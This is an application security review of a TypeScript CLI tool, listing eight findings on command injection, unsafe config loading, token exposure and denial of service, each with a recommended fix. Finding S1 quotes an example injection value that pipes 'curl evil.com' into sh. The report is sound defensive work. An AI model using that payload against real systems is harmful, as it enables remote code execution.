# Security Review — OAC v2026.4.3

**Reviewer**: security-reviewer (Senior Application Security Engineer)  
**Date**: 2026-02-18  
**Scope**: Full codebase review (~15,000 LOC) — injection, auth, input validation, data exposure

---

## Security Review

### Summary
- **Risk Level**: HIGH
- **Score**: 7.5 / 10
- **Findings**: 8 total (1 critical, 2 high, 2 medium, 3 low)
- **Recommendation**: FIX BEFORE NEXT RELEASE — The critical shell injection must be patched.

### Findings

#### [CRITICAL] S1: Shell injection via `exec()` in dashboard browser opener

- **Category**: Command Injection
- **File**: `src/dashboard/server.ts:258-261`
- **CWE**: CWE-78 (OS Command Injection)
- **Description**: The dashboard constructs a shell command to open the user's browser: `exec(\`${command} ${url}\`)`. The `command` is derived from platform detection (`open`, `xdg-open`, `start`) and `url` is constructed from user-configurable port. While the URL is currently `http://localhost:${port}`, the `exec()` function passes the entire string through the shell, meaning any shell metacharacters in the URL (e.g., from a malicious config override or future URL parameter) would be interpreted.
- **Impact**: An attacker who controls the config file (or a malicious `port` value like `3141; curl evil.com | sh`) could achieve arbitrary command execution.
- **Proof of concept**: Set `dashboard.port` to a crafted value or modify the URL construction path to include user input.
- **Recommendation**: Replace `exec()` with `execFile()` (no shell) or use the `open` npm package:
  ```ts
  // Safe: no shell interpretation
  import { execFile } from "node:child_process";
  execFile(command, [url]);
  ```

#### [HIGH] S2: Shell redirect pattern in GitHub auth check

- **Category**: Command Injection (indirect)
- **File**: `src/cli/github-auth.ts:61`
- **CWE**: CWE-78
- **Description**: `execFileSync("sh", ["-c", "gh auth status 2>&1"])` invokes a shell explicitly to capture stderr via redirect. While the command string is hardcoded (not user-controlled), passing through `sh -c` is unnecessary and sets a bad precedent for future modifications.
- **Impact**: Low exploitability today (hardcoded command), but the pattern is fragile — if anyone adds variable interpolation later, it becomes injectable.
- **Recommendation**: Use `execFileSync("gh", ["auth", "status"], { encoding: "utf8" })` with `stdio: "pipe"` to capture both stdout and stderr without a shell.

#### [HIGH] S3: Unsanitized branch names in git worktree operations

- **Category**: Command Injection (indirect)
- **File**: `src/execution/sandbox.ts:42`
- **CWE**: CWE-78
- **Description**: Branch names are passed to `git worktree add -b ${branchName}` via simple-git. While `sanitizeBranchSegment()` in `engine.ts:74-81` normalizes segments, the full branch name is constructed by string concatenation in `createBranchName` and could contain unexpected characters if the task ID is attacker-controlled (e.g., from a malicious GitHub issue title).
- **Impact**: A crafted task ID could inject git flags or malformed branch names, causing worktree corruption or unexpected git behavior.
- **Recommendation**: Add explicit branch name validation in `createSandbox()`:
  ```ts
  if (!/^[a-zA-Z0-9/_.-]+$/.test(branchName)) {
    throw executionError("INVALID_BRANCH", `Invalid branch name: ${branchName}`);
  }
  ```

#### [MEDIUM] S4: Missing timeout on GitHub API fetch calls

- **Category**: Denial of Service
- **File**: `src/discovery/scanners/github-issues-scanner.ts:105`
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **Description**: The `fetch()` call to the GitHub API has no `AbortController` or timeout. A slow or unresponsive GitHub API would cause the entire scan pipeline to hang indefinitely.
- **Impact**: Process hangs, requiring manual intervention. In CI, this wastes runner time until the CI timeout kills it.
- **Recommendation**: Add `signal: AbortSignal.timeout(30_000)` to the fetch options.

#### [MEDIUM] S5: Dynamic import of config file enables code execution

- **Category**: Insecure Deserialization
- **File**: `src/cli/config-loader.ts:40`
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **Description**: The config loader uses `import(pathToFileURL(absolutePath).href)` to load `oac.config.ts`. This executes arbitrary TypeScript/JavaScript code from the config file. While this is a deliberate design choice (enabling `defineConfig()` with IDE autocomplete), it means cloning a malicious repo and running `oac run` will execute attacker-controlled code.
- **Impact**: Arbitrary code execution when running OAC on an untrusted repository.
- **Recommendation**: This is a known trade-off (same as `vite.config.ts`, `eslint.config.js`, etc.). Mitigations:
  1. Document the risk in the README ("only run OAC on repositories you trust")
  2. Consider a `--no-config` flag that uses only CLI args and defaults
  3. Long-term: consider JSON-only config option for CI environments

#### [LOW] S6: GitHub token passed via environment variable to child processes

- **File**: `src/execution/agents/claude-code.adapter.ts`, `src/execution/agents/codex.adapter.ts`
- **Description**: The `GITHUB_TOKEN` is passed to agent subprocesses via environment variables. While this is standard practice, it means the AI agent has full access to the GitHub token, including write access to any repo the token can reach.
- **Recommendation**: Consider using a scoped token (repo-specific, read-only where possible) and documenting minimum required GitHub token scopes.

#### [LOW] S7: No rate limiting on dashboard SSE endpoint

- **File**: `src/dashboard/server.ts` (SSE endpoint)
- **Description**: The dashboard's Server-Sent Events endpoint has no connection limit. A local attacker could open thousands of SSE connections to exhaust file descriptors.
- **Recommendation**: Add a maximum connection count (e.g., 10) since the dashboard is meant for local single-user use.

#### [LOW] S8: Contribution logs may contain sensitive repository paths

- **File**: `src/tracking/logger.ts`
- **Description**: Contribution logs written to `.oac/contributions/` contain file paths, branch names, and error messages that could reveal internal project structure if the `.oac/` directory is committed to a public repo.
- **Recommendation**: Ensure `.oac/` is in `.gitignore` by default (the `oac init` command should handle this). Document that `.oac/contributions/` may contain sensitive metadata.

### Positive Observations

1. **No `eval()` anywhere** — Good. All code execution paths use explicit imports.
2. **No hardcoded secrets** — API keys and tokens are sourced from environment variables or `gh auth token`.
3. **`execa` with array args** — All subprocess invocations (except the dashboard browser opener) use `execa` with argument arrays, preventing shell injection.
4. **Atomic file writes** — `atomicWriteJson` prevents partial writes that could corrupt config/tracking data.
5. **Zod validation at config boundary** — Config is validated with strict schemas before use. Unknown fields are rejected.
6. **`encodeURIComponent` for URL construction** — GitHub issues scanner properly encodes owner/repo in URLs.
7. **Env var interpolation is explicit** — `${VAR}` pattern with clear error on missing vars. No silent empty-string substitution.

### Dependency Audit

No `npm audit` was run as part of this review. Recommend adding `pnpm audit` to pre-publish checks. Key dependencies to monitor:
- `execa` — Process execution (attack surface for command injection)
- `simple-git` — Git operations (attack surface for argument injection)
- `zod` — Input validation (foundational security control)
- `fastify` — HTTP server for dashboard (attack surface for network-based attacks)

